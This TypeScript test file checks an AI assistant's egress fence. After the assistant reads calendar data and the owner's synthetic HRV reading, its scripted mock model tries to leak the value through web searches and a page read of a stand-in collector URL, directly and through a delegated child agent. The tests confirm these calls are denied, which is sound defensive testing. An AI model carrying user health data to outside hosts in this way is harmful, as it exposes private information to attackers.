import { env } from 'cloudflare:workers';
import { runInDurableObject } from 'cloudflare:test';
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import type { LLMGatewayRequest } from '../src/llm/provider';
import { claimStore } from '../src/memory/claims';
import { ensureSchema } from '../src/tracer/schema';

// "Plan tomorrow around my energy, given my calendar": the turn reads the owner's own readings and their calendar. The
// calendar is outside content, so once the model has seen both, nothing that sends text out of the account runs for the rest
// of the turn; the readings themselves stay in view so the plan can use them. Synthetic readings only; the value has one
// decimal so no timestamp the turn writes can hold it.
const HRV = '67.4';
const EVENT = 'Quarterly board call';
const CHILD_TASK = 'Read tomorrow on my calendar and report the meetings.';
const model = vi.hoisted(() => ({ requests: [] as LLMGatewayRequest['request'][], order: 'together' as 'together' | 'calendar_first' | 'health_first' | 'stated' | 'delegated' }));
vi.mock('../src/channels/telegram-turn', async load => {
  const original = await load<typeof import('../src/channels/telegram-turn')>();
  const gateway = { async complete({ request }: LLMGatewayRequest) {
    model.requests.push(request);
    const done = (text: string, tool_calls?: Array<{ call_id: string; name: string; arguments: string }>) => ({ ok: true as const, data: { model: request.model, text, ...(tool_calls ? { tool_calls } : {}), input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, latency_ms: 0 } });
    if (request.response_format) return done(request.response_format.name === 'task_source_scope' ? '{"decision":"retain","sources":[]}' : '{"add":[],"corrections":[],"seen":[],"confirm":[],"dismiss":[],"forget_claims":[],"forget_nodes":[]}');
    const asked = String(request.messages.at(-1)?.content ?? '').split('\n\n[memory recalled for this message')[0]!;
    // A child the parent spawned after reading the reading: its first search brings in outside content, then it is steered to
    // search again with the reading.
    if (asked.includes(CHILD_TASK)) {
      const child = request.tool_turns?.length ?? 0;
      return child === 0 ? done('', [{ call_id: 'child-read', name: 'web_search', arguments: JSON.stringify({ query: 'board meeting preparation' }) }])
        : child === 1 ? done('', [{ call_id: 'child-search', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) }])
        : done('Board call at nine.');
    }
    if (!asked.includes('Plan tomorrow around my energy')) return done('Noted.');
    const health = { call_id: 'health-1', name: 'get_health', arguments: JSON.stringify({ signals: ['hrv'], from: '2026-10-12', to: '2026-10-12' }) };
    const calendar = { call_id: 'calendar-1', name: 'query_calendar', arguments: JSON.stringify({ date_range: { from: '2026-10-14T00:00:00Z', to: '2026-10-15T00:00:00Z' } }) };
    // Once it has seen both, the model is steered into carrying the reading out in a search and a page read.
    const egress = [
      { call_id: 'search-1', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) },
      { call_id: 'page-1', name: 'browse_page', arguments: JSON.stringify({ url: `https://collector.example/?v=${HRV}` }) },
    ];
    const delegate = { call_id: 'delegate-1', name: 'delegate_task', arguments: JSON.stringify({ task: CHILD_TASK }) };
    if (model.order === 'delegated') return [done('', [health]), done('', [delegate])][request.tool_turns?.length ?? 0] ?? done('Light morning, board call at nine.');
    const steps = { together: [[health, calendar]], calendar_first: [[calendar], [health]], health_first: [[health], [calendar]], stated: [[calendar]] }[model.order];
    const rounds = request.tool_turns?.length ?? 0;
    let at = 0;
    for (const step of steps) { if (rounds === at) return done('', step); at += step.length; }
    return rounds === at ? done('', egress) : done('Light morning, board call at nine.');
  } };
  return { ...original, createTelegramResponder: (...args: Parameters<typeof original.createTelegramResponder>) => { args[11] = gateway; return original.createTelegramResponder(...args); } };
});
vi.mock('../src/connectors/google', async load => {
  const original = await load<typeof import('../src/connectors/google')>();
  return { ...original, googleClient: (_app: unknown, _tokens: unknown, _fetch: unknown, _health: unknown, account: { connection_id: string | null; email: string | null }) => ({
    account, events: async () => [],
    calendarPage: async () => ({ events: [{ id: 'event-1', title: EVENT, start: '2026-10-14T09:00:00Z', end: '2026-10-14T10:00:00Z', all_day: false }], next_page_token: null, fetched_count: 1, account, observed_at: '2026-10-13T06:30:00Z' }),
  }) };
});
const { OwnerDO } = await import('../src/channels/owner-do');

const OWNER_ID = '7c4d3e2f-1a0b-4c9d-8e7f-6a5b4c3d2e1f';
const directory = { SUPABASE_PROJECT_URL: 'https://directory.fixture.invalid', SUPABASE_PUBLISHABLE_KEY: 'synthetic-publishable', WALDO_ROUTER_HMAC_SECRET: 'synthetic-router-secret' };
const google = { GOOGLE_CLIENT_ID: 'synthetic-client', GOOGLE_CLIENT_SECRET: 'synthetic-secret', WALDO_OAUTH_STATE_SECRET: 'synthetic-state-secret' };
const consentRow = (purpose: string) => ({ consent_class: 'health_processing', source: 'apple', purpose, version: 2, status: 'granted', epoch: 1, granted_at: '2026-10-01T00:00:00Z', withdrawn_at: null, deletion_state: 'not_required' });
const series = { access: 'granted', read_at: '2026-10-13T06:00:00.000Z', sources: [{ source: 'apple', consent_epoch: 1, samples: [
  { signal: 'overnight_hrv', day: '2026-10-12', start_at: '2026-10-11T21:00:00Z', end_at: '2026-10-12T03:00:00Z', timezone: 'UTC', value: Number(HRV), method: 'sdnn' },
] }] };
// Every request that carries the reading anywhere, which must stay empty: the search provider and the browser are fetches too.
const egressCalls: string[] = [];
beforeEach(() => {
  egressCalls.length = 0;
  vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input instanceof Request ? input.url : input);
    if (url.includes(HRV) || String(init?.body ?? '').includes(HRV)) egressCalls.push(url);
    const fn = /\/rest\/v1\/rpc\/([a-z_]+)$/.exec(String(input instanceof Request ? input.url : input))?.[1];
    const asked = init?.body ? JSON.parse(String(init.body)) as Record<string, string> : {};
    if (fn === 'app_session_authority') return Response.json({ owner_id: OWNER_ID, do_name: asked.p_do_name, session_hash: asked.p_session_hash, state_version: 0, admission_revision: '1', expires_at: Date.now() + 3_600_000 });
    if (fn === 'owner_runtime_authority') return Response.json({ owner_id: OWNER_ID, auth_user_id: OWNER_ID, do_name: asked.p_do_name, state_version: 1, admission_revision: '5' });
    if (fn === 'assert_channel_presence') return Response.json(true);
    if (fn === 'health_context_read') return Response.json(null);
    if (fn === 'health_log_recent') return Response.json([]);
    if (fn === 'health_consent_list') return Response.json({ consents: [consentRow('storage_compute'), consentRow('model_processing')] });
    if (fn === 'health_series_read') return Response.json(series);
    return Response.json(true);
  });
});
afterEach(() => { vi.unstubAllGlobals(); model.requests = []; model.order = 'together'; });

const headers = (name: string) => ({ 'x-waldo-do-name': name, 'x-waldo-app-session-hash': 'a'.repeat(64), 'content-type': 'application/json' });
const replyRequests = () => model.requests.filter(request => request.response_format === undefined);

for (const order of ['together', 'calendar_first', 'health_first'] as const) {
  it(`a plan that reads the calendar and the owner's readings (${order}) uses them, and no call that sends text out runs afterwards`, async () => {
    const name = `health-plan-external-${order}`;
    model.order = order;
    await runInDurableObject(env.OWNER_DO!.get(env.OWNER_DO!.idFromName(name)), async (_instance, state) => {
      claimStore(state.storage.sql); ensureSchema(state.storage);
      state.storage.kv.put('do_name', name);
      await state.storage.put('origin', 'https://fixture.invalid');
      await state.storage.put('google:accounts', [{ id: 'local:owner@example.test', email: 'owner@example.test', refresh_token: 'synthetic-offline-only', scopes: ['https://www.googleapis.com/auth/calendar.events'] }]);
      vi.setSystemTime('2026-10-13T06:30:00Z');
      const quiet = vi.spyOn(console, 'error').mockImplementation(() => undefined);
      const owner = new OwnerDO(state, { ...env, ...directory, ...google, TELEGRAM_BOT_TOKEN: undefined, OPENAI_API_KEY: 'synthetic-fixture', WALDO_OWNER_TIMEZONE: 'UTC', WALDO_OWNER_TELEGRAM_ID: undefined });
      try {
        const sent = await owner.fetch(new Request('https://telegram-owner/app/v1/chat/main/messages', { method: 'POST', headers: headers(name), body: JSON.stringify({ client_message_id: `plan-${order}-client-01`, text: 'Plan tomorrow around my energy: what should I do when, given my calendar?' }) }));
        const { message_id: id } = await sent.json() as { message_id: string };
        const settled = () => state.storage.kv.get<{ state: string }>(`app:inbox-record:${id}`)?.state;
        await vi.waitFor(() => expect(['completed', 'interrupted']).toContain(settled()), { timeout: 10_000, interval: 20 });
        expect(settled()).toBe('completed');
        const last = replyRequests().at(-1)!;
        const turns = last.tool_turns ?? [];
        // Trace: both reads ran, then the search and the page read were refused before anything left the account.
        expect(turns.map(turn => turn.call.name)).toEqual([...(order === 'calendar_first' ? ['query_calendar', 'get_health'] : order === 'health_first' ? ['get_health', 'query_calendar'] : ['get_health', 'query_calendar']), 'web_search', 'browse_page']);
        expect(turns.find(turn => turn.call.name === 'query_calendar')!.output).toContain(EVENT);
        expect(turns.find(turn => turn.call.name === 'get_health')!.output).toContain(HRV);
        for (const name of ['web_search', 'browse_page']) expect(turns.find(turn => turn.call.name === name)!.output).toContain('"error_code":"egress_denied"');
        expect(egressCalls).toEqual([]);
        // The provider's hosted search searches again inside one call, after reading its own results, with no dispatch to
        // fence: a request offers it only until one has shown the reading.
        const hosted = replyRequests().filter(request => request.tools?.length).map(request => ({ reading: (request.tool_turns ?? []).some(turn => turn.call.name === 'get_health'), hosted: request.web_search !== undefined }));
        expect(hosted.length).toBeGreaterThan(2);
        expect(hosted.filter(request => request.hosted !== !request.reading)).toEqual([]);
      } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
    });
  });
}

// The owner's own message states the reading, so it rides the request's context, never a tool result: the calendar read still
// fences the turn's egress, and no request offers the hosted search.
it("a reading the owner states in the message fences the turn after an outside read, and keeps the hosted search off", async () => {
  const name = 'health-plan-external-stated';
  model.order = 'stated';
  await runInDurableObject(env.OWNER_DO!.get(env.OWNER_DO!.idFromName(name)), async (_instance, state) => {
    claimStore(state.storage.sql); ensureSchema(state.storage);
    state.storage.kv.put('do_name', name);
    await state.storage.put('origin', 'https://fixture.invalid');
    await state.storage.put('google:accounts', [{ id: 'local:owner@example.test', email: 'owner@example.test', refresh_token: 'synthetic-offline-only', scopes: ['https://www.googleapis.com/auth/calendar.events'] }]);
    vi.setSystemTime('2026-10-13T06:30:00Z');
    const quiet = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const owner = new OwnerDO(state, { ...env, ...directory, ...google, TELEGRAM_BOT_TOKEN: undefined, OPENAI_API_KEY: 'synthetic-fixture', WALDO_OWNER_TIMEZONE: 'UTC', WALDO_OWNER_TELEGRAM_ID: undefined });
    try {
      const sent = await owner.fetch(new Request('https://telegram-owner/app/v1/chat/main/messages', { method: 'POST', headers: headers(name), body: JSON.stringify({ client_message_id: 'plan-stated-client-01', text: `My HRV was ${HRV} ms this morning. Plan tomorrow around my energy: what should I do when, given my calendar?` }) }));
      const { message_id: id } = await sent.json() as { message_id: string };
      const settled = () => state.storage.kv.get<{ state: string }>(`app:inbox-record:${id}`)?.state;
      await vi.waitFor(() => expect(['completed', 'interrupted']).toContain(settled()), { timeout: 10_000, interval: 20 });
      expect(settled()).toBe('completed');
      const turns = replyRequests().at(-1)!.tool_turns ?? [];
      expect(turns.map(turn => turn.call.name)).toEqual(['query_calendar', 'web_search', 'browse_page']);
      for (const name of ['web_search', 'browse_page']) expect(turns.find(turn => turn.call.name === name)!.output).toContain('"error_code":"egress_denied"');
      expect(egressCalls).toEqual([]);
      expect(replyRequests().filter(request => request.web_search !== undefined)).toEqual([]);
    } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
  });
});

// The parent reads the reading, then hands a task to a child, whose brief it wrote after seeing it. The child starts with the
// parent's mark, so once a read brings it outside content, its next search is refused like the parent's would be.
it("a child spawned after the parent read the reading fences its own egress once it reads outside content", async () => {
  const name = 'health-plan-external-delegated';
  model.order = 'delegated';
  await runInDurableObject(env.OWNER_DO!.get(env.OWNER_DO!.idFromName(name)), async (_instance, state) => {
    claimStore(state.storage.sql); ensureSchema(state.storage);
    state.storage.kv.put('do_name', name);
    await state.storage.put('origin', 'https://fixture.invalid');
    await state.storage.put('google:accounts', [{ id: 'local:owner@example.test', email: 'owner@example.test', refresh_token: 'synthetic-offline-only', scopes: ['https://www.googleapis.com/auth/calendar.events'] }]);
    vi.setSystemTime('2026-10-13T06:30:00Z');
    const quiet = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const owner = new OwnerDO(state, { ...env, ...directory, ...google, TELEGRAM_BOT_TOKEN: undefined, OPENAI_API_KEY: 'synthetic-fixture', WALDO_OWNER_TIMEZONE: 'UTC', WALDO_OWNER_TELEGRAM_ID: undefined });
    try {
      const sent = await owner.fetch(new Request('https://telegram-owner/app/v1/chat/main/messages', { method: 'POST', headers: headers(name), body: JSON.stringify({ client_message_id: 'plan-delegated-client-01', text: 'Plan tomorrow around my energy: what should I do when, given my calendar?' }) }));
      const { message_id: id } = await sent.json() as { message_id: string };
      const settled = () => state.storage.kv.get<{ state: string }>(`app:inbox-record:${id}`)?.state;
      await vi.waitFor(() => expect(['completed', 'interrupted']).toContain(settled()), { timeout: 10_000, interval: 20 });
      expect(settled()).toBe('completed');
      const child = model.requests.filter(request => String(request.messages.at(-1)?.content ?? '').includes(CHILD_TASK)).at(-1)!;
      const turns = child.tool_turns ?? [];
      expect(turns.map(turn => turn.call.name)).toEqual(['web_search', 'web_search']);
      expect(turns[0]!.source_taint).toBe('external');
      expect(turns[0]!.output).not.toContain('egress_denied');
      expect(turns[1]!.output).toContain('"error_code":"egress_denied"');
      expect(egressCalls).toEqual([]);
      // A child's own calls never offer the hosted search.
      expect(model.requests.filter(request => String(request.messages.at(-1)?.content ?? '').includes(CHILD_TASK) && request.web_search !== undefined)).toEqual([]);
    } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
  });
});
